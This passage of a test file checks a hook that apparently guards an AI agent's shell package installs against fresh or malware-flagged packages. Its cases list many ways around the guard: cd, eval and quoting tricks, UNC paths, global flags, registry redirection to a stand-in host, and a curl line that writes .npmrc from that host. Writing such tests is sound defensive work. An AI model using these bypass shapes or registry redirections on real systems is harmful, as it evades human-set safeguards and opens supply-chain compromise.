      'npx zz-local-bin-a1 run',
      'npx zz-local-bin-a1 run -t "package-install"',
      'npx -y zz-local-bin-a1',
      'npm exec zz-local-bin-a1',
      'npm x -- zz-local-bin-a1 run',
      'bunx zz-local-bin-a1',
      'bun x zz-local-bin-a1',
    ])('local bin present: %j allows', async (cmd) => {
      expect(await runHook(cmd, { stub: FRESH, cwd: await binFixture(BINS) })).toBeUndefined();
    });
    it('local bin in an ancestor folder: npx zz-local-bin-a1 run allows', async () => {
      expect(await runHook('npx zz-local-bin-a1 run', { stub: FRESH, cwd: await binFixture(BINS, true) })).toBeUndefined();
    });
    // npm 11.12.1 libnpmexec localFileExists walks up from the local prefix to the root, so a bin
    // above a folder that has package.json still runs: nothing is fetched.
    it('bin above the nearest package.json folder: npx zz-local-bin-a1 run allows', async () => {
      const { writeFileSync } = await import('node:fs');
      const { join } = await import('node:path');
      const child = await binFixture(BINS, true);
      writeFileSync(join(child, 'package.json'), '{}');
      expect(await runHook('npx zz-local-bin-a1 run', { stub: FRESH, cwd: child })).toBeUndefined();
    });

    // ----- Local bin at any parent level (bare worktree: the bin sits in a shared parent node_modules) -----
    describe('local bin at any parent level, up to 10 levels', () => {
      const BIN = 'zz-local-bin-a1';
      const made: string[] = [];
      afterEach(async () => {
        const { rmSync } = await import('node:fs');
        for (const d of made.splice(0)) rmSync(d, { recursive: true, force: true });
      });
      /** A temp tree. binAt: folders (under the root) that get node_modules/.bin/BIN. pkgAt: folders with a package.json. cwdRel: the cwd under the root. */
      async function tree(binAt: string[][], pkgAt: string[][], cwdRel: string[]): Promise<string> {
        const { mkdtempSync, mkdirSync, writeFileSync } = await import('node:fs');
        const { tmpdir } = await import('node:os');
        const { join } = await import('node:path');
        const root = mkdtempSync(join(tmpdir(), 'pig-lvl-'));
        made.push(root);
        mkdirSync(join(root, ...cwdRel), { recursive: true });
        for (const rel of binAt) {
          mkdirSync(join(root, ...rel, 'node_modules', '.bin'), { recursive: true });
          writeFileSync(join(root, ...rel, 'node_modules', '.bin', BIN), '');
          writeFileSync(join(root, ...rel, 'node_modules', '.bin', BIN + '.cmd'), '');
        }
        for (const rel of pkgAt) {
          mkdirSync(join(root, ...rel), { recursive: true });
          writeFileSync(join(root, ...rel, 'package.json'), '{}');
        }
        return join(root, ...cwdRel);
      }

      it('(1) bin two levels up, nearest folder has package.json: allows', async () => {
        const cwd = await tree([[]], [['a']], ['a', 'b']);
        expect(await runHook(`npx ${BIN} run`, { stub: FRESH, cwd })).toBeUndefined();
      });
      it('(2) bin only in the nearest folder: allows', async () => {
        const cwd = await tree([['a', 'b']], [['a', 'b']], ['a', 'b']);
        expect(await runHook(`npx ${BIN} run`, { stub: FRESH, cwd })).toBeUndefined();
      });
      it('(3) no bin at any level: npx still denies', async () => {
        const cwd = await tree([], [['a'], ['a', 'b'], []], ['a', 'b', 'c']);
        expect(await runHook(`npx ${BIN} run`, { stub: FRESH, cwd })).toBe('deny');
      });
      it('(4) the cap: a bin 9 levels up is found, a bin 11 levels up is not', async () => {
        const deep = Array.from({ length: 11 }, (_, i) => `d${i}`);
        const found = await tree([[]], [['d0']], deep.slice(0, 9)); // root is 9 levels above cwd
        expect(await runHook(`npx ${BIN} run`, { stub: FRESH, cwd: found })).toBeUndefined();
        const missed = await tree([[]], [['d0']], deep); // root is 11 levels above cwd
        expect(await runHook(`npx ${BIN} run`, { stub: FRESH, cwd: missed })).toBe('deny');
      });
      it('(5) nested worktree under primary/.claude/worktrees/node_modules/.bin: allows', async () => {
        const wt = ['primary', '.claude', 'worktrees', 'guard-local-bin'];
        const cwd = await tree(
          [['primary', '.claude', 'worktrees']],
          [[...wt, '.claude', 'hooks']],
          [...wt, '.claude', 'hooks', 'src'],
        );
        expect(await runHook(`npx ${BIN} run`, { stub: FRESH, cwd })).toBeUndefined();
      });
    });
    it.each([
      'npx -c "npm install zz-fake-pkg-a1"',
      'npx -c "npx zz-fake-pkg-a1"',
      'npm exec --call "npm install zz-fake-pkg-a1"',
      'npm exec --call="npm install zz-fake-pkg-a1"',
    ])('CodeRabbit #285: a command string in -c/--call is not hidden: %j asks or denies', async (cmd) => {
      expect(['ask', 'deny']).toContain(await runHook(cmd, { stub: FRESH, cwd: await emptyDir() }));
    });
    it.each(['timeout', 'sudo', 'env'])('CodeRabbit #285 round 2: %s with 40 repeated -s flags does not stall the leader regex', async (leader) => {
      const cmd = `${leader} ${Array(40).fill('-s').join(' ')} x; npm install zz-fake-pkg-a1`;
      expect(['ask', 'deny']).toContain(await runHook(cmd, { stub: FRESH, cwd: await emptyDir() }));
    }, 8000);
    it('PowerShell: local bin present: npx zz-local-bin-a1 run allows', async () => {
      expect(await runHook('npx zz-local-bin-a1 run', { tool: 'PowerShell', stub: FRESH, cwd: await binFixture(BINS) })).toBeUndefined();
    });
    it('changed (round 3 HIGH 1): only zz-local-bin-b2.cmd exists, so npx zz-local-bin-b2 denies', async () => {
      expect(await runHook('npx zz-local-bin-b2', { stub: FRESH, cwd: await binFixture(BINS) })).toBe('deny');
    });
    it.each([
      'npx -g zz-local-bin-a1 run',
      'npx --global zz-local-bin-a1 run',
      'npx --location=global zz-local-bin-a1 run',
      'npm_config_global=true npx zz-local-bin-a1 run',
      'NPM_CONFIG_LOCATION=global npx zz-local-bin-a1 run',
    ])('round 5 HIGH: global mode ignores the local bin, so %j denies', async (cmd) => {
      expect(await runHook(cmd, { stub: FRESH, cwd: await binFixture(BINS) })).toBe('deny');
    });
    it('round 5 HIGH: a trailing @ fetches name@*, so npx zz-local-bin-a1@ run denies', async () => {
      expect(await runHook('npx zz-local-bin-a1@ run', { stub: FRESH, cwd: await binFixture(BINS) })).toBe('deny');
    });
    it('round 5 HIGH: a line continuation inside cd (c\\<newline>d) still makes the folder unknown', async () => {
      expect(await runHook('c\\\nd "' + (await emptyDir()) + '"; npx zz-local-bin-a1 run', { stub: FRESH, cwd: await binFixture(BINS) })).toBe('deny');
    });
    it('regression: local bin absent: npx zz-local-bin-a1 run still denies', async () => {
      expect(await runHook('npx zz-local-bin-a1 run', { stub: FRESH, cwd: await emptyDir() })).toBe('deny');
    });

    // ----- G6a: the guard follows no cd (round 4 dropped rule 1). Any cd makes the folder unknown: every check runs. -----
    describe('G6a: a cd makes the local-bin folder unknown', () => {
      // Changed (round 4, rule 1 dropped): a cd to a folder with the bin no longer skips the checks.
      it.each([
        ['Bash', (d: string) => `cd "${d}"; npx zz-local-bin-a1 run`],
        ['Bash', (d: string) => `cd '${d}' && npx zz-local-bin-a1 run`],
        ['Bash', (d: string) => `pushd "${d}" && npx zz-local-bin-a1 run`],
        ['PowerShell', (d: string) => `Set-Location "${d}"; npx zz-local-bin-a1 run`],
        ['PowerShell', (d: string) => `Set-Location -Path "${d}"; npx zz-local-bin-a1 run`],
        ['PowerShell', (d: string) => `Push-Location "${d}"; npx zz-local-bin-a1 run`],
        ['Bash', (d: string) => `cd "${d}"\nnpx zz-local-bin-a1 run`],
      ])('%s: cd to a folder with the bin is not followed, so the checks run and deny (#%#)', async (tool, make) => {
        const fixture = await binFixture(BINS);
        expect(await runHook(make(fixture), { tool, stub: FRESH, cwd: await emptyDir() })).toBe('deny');
      });
      it('changed (round 4): a relative cd target is not followed either', async () => {
        const { basename } = await import('node:path');
        const fixture = await binFixture(BINS);
        expect(await runHook(`cd ../${basename(fixture)}; npx zz-local-bin-a1 run`, { stub: FRESH, cwd: await emptyDir() })).toBe('deny');
      });
      it.each(['@zz', '@args', '$zz'])('round 4 HIGH: PowerShell Set-Location %s (splatting, not a folder) is not followed', async (arg) => {
        const { mkdirSync, writeFileSync } = await import('node:fs');
        const { join } = await import('node:path');
        const cwd = await emptyDir();
        mkdirSync(join(cwd, arg, 'node_modules', '.bin'), { recursive: true });
        writeFileSync(join(cwd, arg, 'node_modules', '.bin', 'zz-local-bin-a1'), '');
        expect(await runHook(`Set-Location ${arg}; npx zz-local-bin-a1 run`, { tool: 'PowerShell', stub: FRESH, cwd })).toBe('deny');
      });
      it('fail closed: two cd segments chain (cd A && cd B && npx) is not followed', async () => {
        const { dirname, basename } = await import('node:path');
        const fixture = await binFixture(BINS);
        expect(await runHook(`cd "${dirname(fixture)}" && cd ./${basename(fixture)} && npx zz-local-bin-a1 run`, { stub: FRESH, cwd: await emptyDir() })).toBe('deny');
      });

      // ----- Verify rounds 1-2: shapes the old cd-follow code misread. Each must deny (no local-bin skip). -----
      // "to": the cd target has the bin, the payload cwd has none. "away": the reverse.
      it.each([
        ['env cd', (d: string) => `env cd "${d}"; npx zz-local-bin-a1 run`],
        ['sudo cd', (d: string) => `sudo cd "${d}"; npx zz-local-bin-a1 run`],
        ['nohup cd', (d: string) => `nohup cd "${d}"; npx zz-local-bin-a1 run`],
        ['if body', (d: string) => `if false; then\ncd "${d}"\nfi\nnpx zz-local-bin-a1 run`],
        ['while body', (d: string) => `while false; do\ncd "${d}"\ndone\nnpx zz-local-bin-a1 run`],
        ['function body', (d: string) => `f() {\ncd "${d}"\n}\nnpx zz-local-bin-a1 run`],
        ['cd, rm node_modules, npx', (d: string) => `cd "${d}"; rm -rf node_modules; npx zz-local-bin-a1 run`],
        ['cd, rm node_modules && npx', (d: string) => `cd "${d}" && rm -rf node_modules && npx zz-local-bin-a1 run`],
      ])('bypass (to): %s is not followed', async (_name, make) => {
        expect(await runHook(make(await binFixture(BINS)), { stub: FRESH, cwd: await emptyDir() })).toBe('deny');
      });
      it.each([
        ['subshell', (d: string) => `(cd "${d}"; npx zz-local-bin-a1 run)`],
        ['quoted c\'\'d', (d: string) => `c''d "${d}"; npx zz-local-bin-a1 run`],
        ['escaped c\\d', (d: string) => `c\\d "${d}"; npx zz-local-bin-a1 run`],
        ['quoted "cd"', (d: string) => `"cd" "${d}"; npx zz-local-bin-a1 run`],
        ['variable command word', (d: string) => `X=c; \${X}d "${d}"; npx zz-local-bin-a1 run`],
        ['source', () => 'source ./zz-env.sh; npx zz-local-bin-a1 run'],
        ['eval', () => 'eval "$ZZ"; npx zz-local-bin-a1 run'],
      ])('bypass (away): %s may move the folder, so the payload cwd is not trusted', async (_name, make) => {
        expect(await runHook(make(await emptyDir()), { stub: FRESH, cwd: await binFixture(BINS) })).toBe('deny');
      });
      it.each(['cd /tmp', 'cd /', 'cd //zz-host/zz-share'])('fail closed: Bash %j (a leading / other than a /c/ drive mount) is not followed', async (cd) => {
        const { basename } = await import('node:path');
        const fixture = await binFixture(BINS);
        expect(await runHook(`${cd}/${basename(fixture)}; npx zz-local-bin-a1 run`, { stub: FRESH, cwd: await emptyDir() })).toBe('deny');
        expect(await runHook(`${cd}; npx zz-local-bin-a1 run`, { stub: FRESH, cwd: fixture })).toBe('deny');
      });
      it('fail closed: a bare relative cd target (CDPATH may apply) is not followed', async () => {
        const { basename, dirname } = await import('node:path');
        const fixture = await binFixture(BINS);
        expect(await runHook(`cd ${basename(fixture)}; npx zz-local-bin-a1 run`, { stub: FRESH, cwd: dirname(fixture) })).toBe('deny');
      });
      it('changed (round 4): cd ./dir is not followed, with or without CDPATH', async () => {
        const { basename, dirname } = await import('node:path');
        const fixture = await binFixture(BINS);
        const cmd = `cd ./${basename(fixture)}; npx zz-local-bin-a1 run`;
        expect(await runHook(cmd, { stub: FRESH, cwd: dirname(fixture) })).toBe('deny');
        expect(await runHook(cmd, { stub: FRESH, cwd: dirname(fixture), env: { CDPATH: await emptyDir() } })).toBe('deny');
      });
      it('bypass: cd AWAY from the folder that has the bin: npx fetches, so it denies', async () => {
        const away = await emptyDir();
        expect(await runHook(`cd "${away}"; npx zz-local-bin-a1 run`, { stub: FRESH, cwd: await binFixture(BINS) })).toBe('deny');
      });
      it.each([
        'cd $TARGET; npx zz-local-bin-a1 run',
        'cd ~/zz-proj; npx zz-local-bin-a1 run',
        'cd /zz-missing-a1-dir; npx zz-local-bin-a1 run',
        'cd -; npx zz-local-bin-a1 run',
        'cd; npx zz-local-bin-a1 run',
        'cd zz-*; npx zz-local-bin-a1 run',
      ])('fail closed: %j has no resolvable folder, so no local-bin skip (payload cwd has the bin)', async (cmd) => {
        expect(await runHook(cmd, { stub: FRESH, cwd: await binFixture(BINS) })).toBe('deny');
      });
      it.each([
        (d: string) => `cd "${d}" || npx zz-local-bin-a1 run`,
        (d: string) => `cd "${d}" | npx zz-local-bin-a1 run`,
        (d: string) => `cd "${d}" & npx zz-local-bin-a1 run`,
        (d: string) => `false && cd "${d}"; npx zz-local-bin-a1 run`,
        (d: string) => `(cd "${d}"); npx zz-local-bin-a1 run`,
        (d: string) => `cd "${d}"; popd; npx zz-local-bin-a1 run`,
      ])('fail closed: a cd that may not run, or runs in a subshell, is not followed (#%#)', async (make) => {
        const fixture = await binFixture(BINS);
        expect(await runHook(make(fixture), { stub: FRESH, cwd: await emptyDir() })).toBe('deny');
      });
      it('a later cd to an unresolved folder cancels an earlier good one', async () => {
        const fixture = await binFixture(BINS);
        expect(await runHook(`cd "${fixture}"; cd $ELSEWHERE; npx zz-local-bin-a1 run`, { stub: FRESH, cwd: await emptyDir() })).toBe('deny');
      });
      it('a command substitution after a cd does not inherit the folder (fail closed)', async () => {
        const fixture = await binFixture(BINS);
        expect(await runHook(`cd "${fixture}"; echo $(npx zz-local-bin-a1 run)`, { stub: FRESH, cwd: await emptyDir() })).toBe('deny');
      });
      it('bypass: a cd inside a shell comment never runs, so it is not followed', async () => {
        const fixture = await binFixture(BINS);
        expect(await runHook(`echo x # ; cd "${fixture}"\nnpx zz-local-bin-a1 run`, { stub: FRESH, cwd: await emptyDir() })).toBe('deny');
      });
      it.each(['Set-Location', 'sl', 'chdir', 'CD', 'Push-Location', 'PUSHD'])('bypass: %s is not a Bash cd, so Bash does not follow it', async (word) => {
        const fixture = await binFixture(BINS);
        expect(await runHook(`${word} "${fixture}"; npx zz-local-bin-a1 run`, { tool: 'Bash', stub: FRESH, cwd: await emptyDir() })).toBe('deny');
      });
      it.each(['cd', 'CD', 'chdir', 'sl', 'Set-Location', 'pushd'])('changed (round 4): PowerShell does not follow %s', async (word) => {
        const fixture = await binFixture(BINS);
        expect(await runHook(`${word} "${fixture}"; npx zz-local-bin-a1 run`, { tool: 'PowerShell', stub: FRESH, cwd: await emptyDir() })).toBe('deny');
      });
      it('desktop-commander reads the text in both dialects: a Bash-only miss still denies', async () => {
        const fixture = await binFixture(BINS);
        const tool = 'mcp__plugin_desktop-commander_desktop-commander__start_process';
        expect(await runHook(`Set-Location "${fixture}"; npx zz-local-bin-a1 run`, { tool, stub: FRESH, cwd: await emptyDir() })).toBe('deny');
      });
      it('bypass: the desktop-commander shell keeps its own folder, not the session cwd', async () => {
        const tool = 'mcp__plugin_desktop-commander_desktop-commander__interact_with_process';
        expect(await runHook('npx zz-local-bin-a1 run', { tool, stub: FRESH, cwd: await binFixture(BINS) })).toBe('deny');
      });
      it.each([
        'cd //10.255.255.1/zzshare; npm install zz-fake-pkg-a1',
        'cd "\\\\10.255.255.1\\zzshare"; npm install zz-fake-pkg-a1',
        'cd //10.255.255.1/zzshare && npm ci',
      ])('a UNC target is never opened by the hook: %j is gated fast', async (cmd) => {
        const t0 = Date.now();
        gated(await runHook(cmd, { stub: FRESH, cwd: await emptyDir() }));
        expect(Date.now() - t0).toBeLessThan(8000);
      }, 25_000);
      it('a UNC Set-Location target in PowerShell is never opened either', async () => {
        const t0 = Date.now();
        gated(await runHook("Set-Location '\\\\10.255.255.1\\zzshare'; npm install zz-fake-pkg-a1", { tool: 'PowerShell', stub: FRESH, cwd: await emptyDir() }));
        expect(Date.now() - t0).toBeLessThan(8000);
      }, 25_000);
      it.each([
        (d: string) => `if true; then cd "${d}"; fi; npx zz-local-bin-a1 run`,
        (d: string) => `true && { cd "${d}"; }; npx zz-local-bin-a1 run`,
        (d: string) => `eval "cd ${d}"; npx zz-local-bin-a1 run`,
        (d: string) => `for i in 1; do cd "${d}"; done; npx zz-local-bin-a1 run`,
      ])('bypass: a cd that is not the first word of its segment makes the folder unknown (#%#)', async (make) => {
        expect(await runHook(make(await emptyDir()), { stub: FRESH, cwd: await binFixture(BINS) })).toBe('deny');
      });
      it('bypass: PowerShell cd.. (no space) makes the folder unknown', async () => {
        expect(await runHook('cd..; npx zz-local-bin-a1 run', { tool: 'PowerShell', stub: FRESH, cwd: await binFixture(BINS, true) })).toBe('deny');
      });
      it.each([
        (d: string) => `env -C "${d}" npx zz-local-bin-a1 run`,
        (d: string) => `npx --prefix "${d}" zz-local-bin-a1 run`,
        (d: string) => `npm --prefix "${d}" exec zz-local-bin-a1`,
        (d: string) => `env --chdir="${d}" npx zz-local-bin-a1 run`,
      ])('bypass: an option that moves the folder of the runner skips no check (#%#)', async (make) => {
        expect(await runHook(make(await emptyDir()), { stub: FRESH, cwd: await binFixture(BINS) })).toBe('deny');
      });
      it('bypass: Bash reads an unquoted backslash as an escape, so cd ..\\dir fails and is not followed', async () => {
        const { basename } = await import('node:path');
        const fixture = await binFixture(BINS);
        const cmd = `cd ..\\${basename(fixture)}; npx zz-local-bin-a1 run`;
        expect(await runHook(cmd, { tool: 'Bash', stub: FRESH, cwd: await emptyDir() })).toBe('deny');
      });
      it('changed (round 4): PowerShell does not follow cd ..\\dir', async () => {
        const { basename } = await import('node:path');
        const fixture = await binFixture(BINS);
        const cmd = `cd ..\\${basename(fixture)}; npx zz-local-bin-a1 run`;
        expect(await runHook(cmd, { tool: 'PowerShell', stub: FRESH, cwd: await emptyDir() })).toBe('deny');
      });
      it.each(['Bash', 'PowerShell'])('%s: cd /d is a cmd.exe form, not a cd to the folder', async (tool) => {
        const fixture = await binFixture(BINS);
        expect(await runHook(`cd /d "${fixture}"; npx zz-local-bin-a1 run`, { tool, stub: FRESH, cwd: await emptyDir() })).toBe('deny');
      });
      it.runIf(process.platform === 'win32')('changed (round 4): neither PowerShell nor Bash follows cd /c/... (MSYS path)', async () => {
        const fixture = await binFixture(BINS);
        const msys = fixture.replace(/^([A-Za-z]):/, (_m, d: string) => `/${d.toLowerCase()}`).replace(/\\/g, '/');
        expect(await runHook(`cd ${msys}; npx zz-local-bin-a1 run`, { tool: 'PowerShell', stub: FRESH, cwd: await emptyDir() })).toBe('deny');
        expect(await runHook(`cd ${msys}; npx zz-local-bin-a1 run`, { tool: 'Bash', stub: FRESH, cwd: await emptyDir() })).toBe('deny');
      });
      it('bypass: CDPATH in the command can send cd elsewhere, so a relative cd is not followed', async () => {
        const { mkdirSync } = await import('node:fs');
        const { basename, dirname, join } = await import('node:path');
        const deeper = await binFixture(BINS, true); // <root>/zz-sub/zz-deeper, the bin is in <root>
        const elsewhere = await emptyDir();
        mkdirSync(join(elsewhere, basename(deeper)));
        const cmd = `export CDPATH="${elsewhere}"; cd ${basename(deeper)}; npx zz-local-bin-a1 run`;
        expect(await runHook(cmd, { stub: FRESH, cwd: dirname(deeper) })).toBe('deny');
      });
      it('changed (round 4): npm ci after a cd is gated, even when the cd target has the lockfile', async () => {
        const { mkdtempSync, writeFileSync } = await import('node:fs');
        const { tmpdir } = await import('node:os');
        const { join } = await import('node:path');
        const withLock = mkdtempSync(join(tmpdir(), 'pig-lock-'));
        writeFileSync(join(withLock, 'package-lock.json'), '{}');
        gated(await runHook(`cd "${await emptyDir()}"; npm ci`, { stub: FRESH, cwd: withLock }));
        gated(await runHook(`cd "${withLock}"; npm ci`, { stub: FRESH, cwd: await emptyDir() }));
      });
    });

    // ----- G6b: the local bin skips OSV; an OSV hit with no version must say the version is unknown -----
    describe('G6b: OSV and the local bin, OSV with no version', () => {
      const MAL: Stub = { ageHours: 2400, osvMal: true };
      it('local bin in the payload cwd: OSV is skipped, so a MAL advisory does not stop the run', async () => {
        expect(await runHook('npx zz-local-bin-a1 run', { stub: MAL, cwd: await binFixture(BINS) })).toBeUndefined();
      });
      it('changed (round 4): a cd to the bin folder is not followed: OSV runs, and the deny says the version is unknown', async () => {
        const fixture = await binFixture(BINS);
        const r = await runHookFull(`cd "${fixture}"; npx zz-local-bin-a1 run`, { stub: MAL, cwd: await emptyDir() });
        expect(r.decision).toBe('deny');
        expect(r.reason).toMatch(/MAL-2026-0001/);
        expect(r.reason).toMatch(/version[^.]*unknown|unknown[^.]*version/i);
      });
      it('no local bin and no version: the OSV deny says the version is unknown', async () => {
        const r = await runHookFull('npx zz-fake-pkg-a1', { stub: MAL, cwd: await emptyDir() });
        expect(r.decision).toBe('deny');
        expect(r.reason).toMatch(/MAL-2026-0001/);
        expect(r.reason).toMatch(/version[^.]*unknown|unknown[^.]*version/i);
      });
      it.each(['npm install zz-fake-pkg-a1@latest', 'npm install zz-fake-pkg-a1@next', 'npm install zz-fake-pkg-a1@^1.0.0'])('a tag or range is not a known version: %j says the version is unknown', async (cmd) => {
        const r = await runHookFull(cmd, { stub: MAL, cwd: await emptyDir() });
        expect(r.decision).toBe('deny');
        expect(r.reason).toMatch(/MAL-2026-0001/);
        expect(r.reason).toMatch(/version[^.]*unknown|unknown[^.]*version/i);
      });
      it('a pinned version: the OSV deny names the advisory with no unknown-version note', async () => {
        const r = await runHookFull('npm install zz-fake-pkg-a1@1.0.0', { stub: MAL, cwd: await emptyDir() });
        expect(r.decision).toBe('deny');
        expect(r.reason).toMatch(/MAL-2026-0001/);
        expect(r.reason).not.toMatch(/unknown/i);
      });
      // CodeRabbit #291 (Major), Dave 11-04: a CRITICAL advisory for an unknown version asks; an exact version still denies.
      const CRIT: Stub = { ageHours: 2400, osvCrit: true };
      it.each(['npm install zz-fake-pkg-a1', 'npm install zz-fake-pkg-a1@latest', 'npm install zz-fake-pkg-a1@^1.0.0', 'npx zz-fake-pkg-a1'])(
        'CRITICAL with no exact version: %j asks and says the version is unknown', async (cmd) => {
          const r = await runHookFull(cmd, { stub: CRIT, cwd: await emptyDir() });
          expect(r.decision).toBe('ask');
          expect(r.reason).toMatch(/GHSA-zzzz-crit-0001/);
          expect(r.reason).toMatch(/version[^.]*unknown|unknown[^.]*version/i);
        });
      it('CRITICAL with an exact version: npm install zz-fake-pkg-a1@1.0.0 still denies', async () => {
        const r = await runHookFull('npm install zz-fake-pkg-a1@1.0.0', { stub: CRIT, cwd: await emptyDir() });
        expect(r.decision).toBe('deny');
        expect(r.reason).toMatch(/GHSA-zzzz-crit-0001/);
      });
    });
    // CodeRabbit #291 (Minor): config, set and registry inside a package name are not a config write.
    it.each([
      'npm install eslint-config-prettier@9.0.0',
      'npm install set-value@4.1.0',
      'npm install lodash.set@4.3.2',
      'npm install npm-registry-fetch@17.0.0',
    ])('G2 regression: %j (a word inside a package name) allows', async (cmd) => {
      expect(await runHook(cmd, { stub: { ageHours: 2400 }, cwd: await emptyDir() })).toBeUndefined();
    });
    it.each([
      'npm config set registry https://zz-fake-host.example && npm install',
      'npm c set registry https://zz-fake-host.example && npm install',
      'npm set registry https://zz-fake-host.example && npm install',
      'npm config set reg\\istry https://zz-fake-host.example && npm install',
    ])('G2 still gated after the whole-word fix: %j', async (cmd) => {
      expect(['ask', 'deny']).toContain(await runHook(cmd, { stub: { ageHours: 2400 }, cwd: await emptyDir() }));
    });
    it.each([
      'npx zz-local-bin-a1@1.0.0',
      'npx zz-local-bin-a1@latest',
      'npx --tag next zz-local-bin-a1',
      'npx -p zz-fake-pkg-a1 zz-local-bin-a1',
      'npx --package=zz-fake-pkg-a1 zz-local-bin-a1',
      'pnpm dlx zz-local-bin-a1',
      'pnpx zz-local-bin-a1',
      'yarn dlx zz-local-bin-a1',
      'uvx zz-local-bin-a1',
      'npx @zz-scope/zz-local-bin-a1',
    ])('regression: local bin present but %j still checks the package (fresh: denied)', async (cmd) => {
      expect(await runHook(cmd, { stub: { ageHours: 1, nextHours: 1 }, cwd: await binFixture(BINS) })).toBe('deny');
    });
  });

  // ----- False positives: the loose verb scan read a test filter as an install verb -----
  describe('repair: a non-install subcommand ends the loose verb scan', () => {
    it.each([
      'npm test -- -t install',
      'npm run test -- install',
      'pnpm test -- -t add',
      'npm start -- i',
      'yarn run test -- add',
    ])('%j allows', async (cmd) => {
      expect(await runHook(cmd, { stub: FRESH })).toBeUndefined();
    });
    it.each([
      'npm --prefix x install zz-fake-pkg-a1',
      'npm "i" zz-fake-pkg-a1',
    ])('regression: %j still denies (fresh)', async (cmd) => {
      expect(await runHook(cmd, { stub: FRESH })).toBe('deny');
    });
    it.each([
      // A flag value named like a subcommand is not the subcommand: npm installs in workspace "test".
      'npm -w test install zz-fake-pkg-a1',
      // -- before any subcommand only ends the options: npm still runs install.
      'npm -w ws -- install zz-fake-pkg-a1',
      'npm -w ws install zz-fake-pkg-a1',
    ])('regression: %j still gates (fresh)', async (cmd) => {
      gated(await runHook(cmd, { stub: FRESH }));
    });
  });

  // ----- G1-G4: follow-ups from the 2026-11-04 handoff (package-guard-followups) -----
  const REG = 'https://zz-fake-host.example';
  const pkgNames = (cmd: string) => extractPackageNames(cmd).map((p) => p.name);

  describe('G1: uv global options before the verb', () => {
    it.each([
      'uv --directory /zz run --with zz-fake-pkg-a1 python x.py',
      'uv --directory=/zz run --with zz-fake-pkg-a1 python x.py',
      'uv --project /zz --quiet run --with zz-fake-pkg-a1 python x.py',
      'uv --directory /zz tool run zz-fake-pkg-a1',
      'uv --directory /zz tool install zz-fake-pkg-a1',
      'uv --directory /zz add zz-fake-pkg-a1',
    ])('%j is read like the plain uv form', (cmd) => {
      expect(pkgNames(cmd)).toEqual(['zz-fake-pkg-a1']);
      expect(installSegments(cmd)).toHaveLength(1);
    });
    it('uv --project X pip install keeps the pip pin rule', () => {
      expect(unpinnedPipPackages('uv --project /zz pip install zz-fake-pkg-a1')).toEqual(['zz-fake-pkg-a1']);
      expect(unpinnedPipPackages('uv --project /zz pip install zz-fake-pkg-a1==1.0.0')).toEqual([]);
    });
    it('a fresh package behind uv --directory is denied by the built hook', async () => {
      expect(await runHook('uv --directory /zz run --with zz-fake-pkg-a1 python x.py', { stub: FRESH })).toBe('deny');
      expect(await runHook('uv --project /zz pip install zz-fake-pkg-a1', { stub: OLD })).toBe('deny');
    });
    it('regression: uv run with no package, with global options, allows', async () => {
      expect(await runHook('uv --directory /zz run pytest -q', { stub: FRESH })).toBeUndefined();
      expect(await runHook('uv --project /zz pip list', { stub: FRESH })).toBeUndefined();
    });
    it('40 repeated global options do not stall the matcher', async () => {
      const cmd = `uv ${Array(40).fill('--directory').join(' ')} x; npm install zz-fake-pkg-a1`;
      gated(await runHook(cmd, { stub: FRESH }));
    }, 8000);
  });

  describe('G2: a registry change chained with a bare install', () => {
    it.each([
      `npm config set registry ${REG} && npm install`,
      `npm set registry ${REG} && npm install`,
      `npm config set registry ${REG}; npm ci`,
      `pnpm config set registry ${REG} && pnpm install`,
      `export npm_config_registry=${REG}; npm install`,
    ])('installSegments keeps the bare install when the command sets a registry: %j', (cmd) => {
      expect(installSegments(cmd)).toHaveLength(1);
    });
    it.each([
      `npm config set registry ${REG} && npm install`,
      `npm set registry ${REG} && npm install`,
      `pnpm config set registry ${REG} && pnpm install`,
      `export npm_config_registry=${REG}; npm install`,
    ])('Bash: the built hook gates %j', async (cmd) => {
      gated(await runHook(cmd, { stub: OLD }));
    });
    it.each([
      `yarn config set registry ${REG} && yarn install`,
      `yarn config set npmRegistryServer ${REG} && yarn install`,
      `yarn config set registry ${REG} && yarn`,
      `npm c set registry ${REG} && npm install`,
      `npm config set registry ${REG} && yarn install`,
      `echo registry=${REG} > .npmrc && npm install`,
      `printf 'registry=${REG}' >> .npmrc; npm ci`,
    ])('Bash: the built hook gates %j (yarn, the c alias, an rc file write)', async (cmd) => {
      gated(await runHook(cmd, { stub: OLD }));
    });
    it.each([
      `npm config set registry ${REG}`,
      `npm set registry ${REG}`,
      `yarn config set npmRegistryServer ${REG}`,
      `echo registry=${REG} > .npmrc`,
      `npm config set -g registry ${REG}`,
    ])('a registry change on its own persists for later installs, so %j is gated', async (cmd) => {
      gated(await runHook(cmd, { stub: OLD }));
    });
    it.each([
      `npm config set -g registry ${REG} && npm i`,
      `npm config set --location project registry ${REG} && npm i`,
      `npm config set a=b registry=${REG} && npm i`,
      `npm config set --global registry=${REG} && npm i`,
      `npm config set @zz:registry=${REG} && npm i`,
      `pnpm config set --location=project registry ${REG} && pnpm install`,
      `yarn config set -H npmRegistryServer ${REG} && yarn install`,
      `yarn config set npmScopes.zz.npmRegistryServer ${REG} && yarn install`,
    ])('a registry key anywhere after the set verb, with any flags: %j is gated', async (cmd) => {
      gated(await runHook(cmd, { stub: OLD }));
    });
    // Changed (round 4 G2 raw rule): quoted text is read too. A registry word in a commit message chained with an install asks (fail closed).
    it('changed (round 4): a registry key in quoted text chained with an install is gated', async () => {
      gated(await runHook(`git commit -m "npm config set -g registry ${REG}" && npm install`, { stub: OLD }));
    });
    it('regression: a bare yarn install, yarn alone and unrelated writes stay allowed', async () => {
      for (const cmd of ['yarn install', 'yarn', 'echo hello > notes.txt && npm install', 'yarn config get registry']) {
        expect(await runHook(cmd, { stub: OLD })).toBeUndefined();
      }
    });
    it('changed (round 4): any package-manager config command chained with an install is gated', async () => {
      gated(await runHook('yarn config set loglevel warn && yarn install', { stub: OLD }));
    });
    it.each([
      `npm config set reg\\istry ${REG} && npm install zz-fake-pkg-a1@1.0.0`,
      'K=registry; npm config set $K U && npm i',
      `curl -so .npmrc ${REG}/rc && npm install zz-fake-pkg-a1@1.0.0`,
      'ln -sf /tmp/rc .npmrc && npm i',
      'sed -i s/a/b/ .npmrc && npm i',
      `node -e "require('fs').writeFileSync('.npmrc','registry=U')" && npm i`,
      `pip config --user set global.index-url ${REG}/simple && pip install zz-fake-py==1.0.0`,
      'python -m pip config --site set global.extra-index-url U && pip install zz-fake-py==1.0.0',
      'npm config set reg""istry U && npm install',
      "npm config set r'e'gistry U && npm install",
      'npm config set reg`echo`istry U && npm install',
